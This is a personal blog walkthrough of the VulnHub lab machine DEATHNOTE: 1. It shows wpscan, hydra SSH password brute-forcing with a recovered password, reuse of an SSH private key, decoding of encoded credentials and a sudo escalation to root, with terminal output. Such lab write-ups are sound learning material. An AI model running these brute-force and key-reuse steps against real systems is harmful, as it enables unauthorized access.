---
layout: post
title:  "Updates 10 September"
date:   2021-09-10 22:00:00 +1000
category: hacking
---

Long time no post eh. What have I been up to? Can't remember lol. I did [Horizontall](https://www.hackthebox.eu/home/machines/profile/374) from HackTheBox. I did a few [crackmes](https://crackmes.one/). I did some stuff from THM. I tried to do [Darkhole 2](https://www.vulnhub.com/entry/darkhole-2,740/) from VulnHub but I couldn't connect to it from my Kali VM. Whatever. 

Oh, and just now I did [DEATHNOTE: 1](https://www.vulnhub.com/entry/deathnote-1,739/) from VulnHub. 

## Ports
HTTP and SSH.

## HTTP
Attempting to go to the IP just gives a message about not being able to reach *deathnote.vuln*, so add this to /etc/hosts and try again. It's a wordpress install. There is a hint:

>Find a notes.txt file on server

Where does stuff go on Wordpress? **wp-content/uploads**

>http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/

{% highlight shell %}
[TXT]	notes.txt	2021-07-19 10:08 	449 	 
[TXT]	user.txt	2021-07-19 10:38 	91 	 
{% endhighlight %}

Looks like we have usernames and passwords. Try wpscan:

{% highlight shell %}
┌──(root💀kali)-[/opt/vulnhub/deathnote]
└─# wpscan -U ./user -P ./pass --url http://deathnote.vuln/wordpress      
# etc
[i] No Valid Passwords Found.
# etc
{% endhighlight %}

Oh. Hydra then?

{% highlight shell %}
┌──(root💀kali)-[/opt/vulnhub/deathnote]
└─# hydra -L ./user -P ./pass ssh://deathnote.vuln
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-09-10 08:09:09
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 731 login tries (l:17/p:43), ~46 tries per task
[DATA] attacking ssh://deathnote.vuln:22/
[STATUS] 289.00 tries/min, 289 tries in 00:01h, 444 to do in 00:02h, 16 active
[22][ssh] host: deathnote.vuln   login: l   password: death4me
[STATUS] 295.50 tries/min, 591 tries in 00:02h, 142 to do in 00:01h, 16 active
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
{% endhighlight %}

Bingo. Let's login:

{% highlight shell %}
┌──(root💀kali)-[/opt/vulnhub/deathnote]
└─# ssh l@deathnote.vuln
The authenticity of host 'deathnote.vuln (192.168.1.60)' cant be established.
ECDSA key fingerprint is SHA256:IT1oaQY12jhOmyoQGZC1hKHtYUWy6i8rET2yKX0KkpI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'deathnote.vuln,192.168.1.60' (ECDSA) to the list of known hosts.
l@deathnote.vulns password: 
Linux deathnote 4.19.0-17-amd64 #1 SMP Debian 4.19.194-2 (2021-06-21) x86_64
l@deathnote:~$ sudo -l
[sudo] password for l: 
Sorry, user l may not run sudo on deathnote.
{% endhighlight %}

Now what? Looking around we have another user, kira. We can read their *authorized_keys* file:

{% highlight shell %}
l@deathnote:/home/kira/.ssh$ ls -lash
total 12K
4.0K drwxr-xr-x 2 kira kira 4.0K Jul 19 11:14 .
4.0K drwxr-xr-x 4 kira kira 4.0K Sep  4 06:10 ..
4.0K -rw-r--r-- 1 kira kira  393 Jul 19 11:14 authorized_keys
l@deathnote:/home/kira/.ssh$ cat authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDyiW87OWKrV0KW13eKWJir58hT8IbC6Z61SZNh4Yzm9XlfTcCytDH56uhDOqtMR6jVzs9qCSXGQFLhc6IMPF69YMiK9yTU5ahT8LmfO0ObqSfSAGHaS0i5A73pxlqUTHHrzhB3/Jy93n0NfPqOX7HGkLBasYR0v/IreR74iiBI0JseDxyrZCLcl6h9V0WiU0mjbPNBGOffz41CJN78y2YXBuUliOAj/6vBi+wMyFF3jQhP4Su72ssLH1n/E2HBimD0F75mi6LE9SNuI6NivbJUWZFrfbQhN2FSsIHnuoLIJQfuFZsQtJsBQ9d3yvTD2k/POyhURC6MW0V/aQICFZ6z l@deathnote
{% endhighlight %}

That's our user. We can copy down the id_rsa key for our user (l), chmod 600 on it and log in as *kira*.

{% highlight shell %}
┌──(root💀kali)-[/opt/vulnhub/deathnote]
└─# chmod 600 id_rsa  
                                                                                                                                       
┌──(root💀kali)-[/opt/vulnhub/deathnote]
└─# ssh -i id_rsa kira@deathnote.vuln
Linux deathnote 4.19.0-17-amd64 #1 SMP Debian 4.19.194-2 (2021-06-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Sep  4 06:00:09 2021 from 127.0.0.1
kira@deathnote:~$ ls -lash
total 32K
4.0K drwxr-xr-x 4 kira kira 4.0K Sep  4 06:10 .
4.0K drwxr-xr-x 4 root root 4.0K Jul 19 11:00 ..
   0 -rw------- 1 kira kira    0 Sep  4 06:10 .bash_history
4.0K -rw-r--r-- 1 kira kira  220 Jul 19 11:00 .bash_logout
4.0K -rw-r--r-- 1 kira kira 3.5K Jul 19 11:00 .bashrc
4.0K -rwx------ 1 kira root   85 Aug 29 11:31 kira.txt
4.0K drwxr-xr-x 3 kira kira 4.0K Jul 19 11:14 .local
4.0K -rw-r--r-- 1 kira kira  807 Jul 19 11:00 .profile
4.0K drwxr-xr-x 2 kira kira 4.0K Jul 19 11:14 .ssh
kira@deathnote:~$ cat kira.txt
cGxlYXNlIHByb3RlY3Qgb25lIG9mIHRoZSBmb2xsb3dpbmcgCjEuIEwgKC9vcHQpCjIuIE1pc2EgKC92YXIp
kira@deathnote:~$ cat kira.txt | base64 -d
please protect one of the following 
1. L (/opt)
2. Misa (/var)
{% endhighlight %}

What's in there? Go poke around....

{% highlight shell %}
kira@deathnote:/opt/L/fake-notebook-rule$ file case.wav
case.wav: ASCII text
kira@deathnote:/opt/L/fake-notebook-rule$ cat case.wav
63 47 46 7a 63 33 64 6b 49 44 6f 67 61 32 6c 79 59 57 6c 7a 5a 58 5a 70 62 43 41 3d
{% endhighlight %}

Decodes to *passwd : kiraisevil*

{% highlight shell %}
kira@deathnote:/opt/L/fake-notebook-rule$ sudo -l
[sudo] password for kira: 
Matching Defaults entries for kira on deathnote:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User kira may run the following commands on deathnote:
    (ALL : ALL) ALL
kira@deathnote:/opt/L/fake-notebook-rule$ sudo su
root@deathnote:/opt/L/fake-notebook-rule# id;hostname;date
uid=0(root) gid=0(root) groups=0(root)
deathnote
Fri 10 Sep 2021 08:14:54 AM EDT
root@deathnote:/opt/L/fake-notebook-rule# cd /root
root@deathnote:~#
{% endhighlight %}

And done. I liked this because even though it was themed I didn't need to know anything about the story/characters (it's some anime thing I think), but it probably added some flavour if you're into that particular thing. So that's good.
